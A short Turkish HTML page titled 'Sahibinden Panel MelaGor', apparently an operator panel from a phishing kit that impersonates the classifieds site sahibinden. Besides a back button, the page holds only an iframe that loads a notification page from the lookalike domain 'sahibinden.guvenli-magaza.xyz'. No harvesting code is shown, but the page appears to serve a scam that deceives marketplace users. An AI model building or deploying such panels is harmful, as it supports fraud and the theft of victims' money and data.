<!DOCTYPE html>
<html lang="tr">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" type="text/css" href="style/style.css">
<meta charset="UTF-8">
<title>Sahibinden Panel MelaGor | Anasayfa</title>
</head>
<body>
<button class="custom-button" onclick="window.location.href='index.php';">Geri</button>
     
<center>
<!-- İframe eklemek için bir div oluşturuyoruz -->
<div style="width: %80; height: 400px; overflow: hidden;">
  <!-- İframe'i ekliyoruz ve sınırları kaldırıyoruz -->
  <iframe src="https://sahibinden.guvenli-magaza.xyz/notify.php" frameborder="0" scrolling="no" style="border: none; width: 100%; height: 100%;"></iframe>
</div>
</center>


   
	
</body>
</html>
